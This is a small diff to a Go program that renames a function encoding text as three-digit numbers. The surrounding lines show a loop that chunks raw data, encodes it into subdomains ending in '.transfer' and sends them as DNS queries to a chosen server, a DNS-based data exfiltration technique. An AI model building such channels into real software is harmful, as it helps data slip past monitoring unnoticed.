@@ -41,8 +41,8 @@ func sendDNSQuery(domain, dnsServer string) {
 	log.Printf("Sent %s", domain)
 }
 
-// Encode UTF-8 text to alphanumeric representation
-func encodeUTF8ToAlphanumeric(text string) string {
+// Encode UTF-8 text to numeric string representation
+func utf8ToNumericString(text string) string {
 	var encoded strings.Builder
 	for _, char := range text {
 		encoded.WriteString(fmt.Sprintf("%03d", char))
@@ -94,7 +94,7 @@ func main() {
 	chunks := splitIntoChunks(rawData, 10)
 
 	for _, chunk := range chunks {
-		dataDomain := fmt.Sprintf("%s.%s.transfer", encodeUTF8ToAlphanumeric(chunk), randomID)
+		dataDomain := fmt.Sprintf("%s.%s.transfer", utf8ToNumericString(chunk), randomID)
 		sendDNSQuery(dataDomain, *dnsServer)
 	}
 
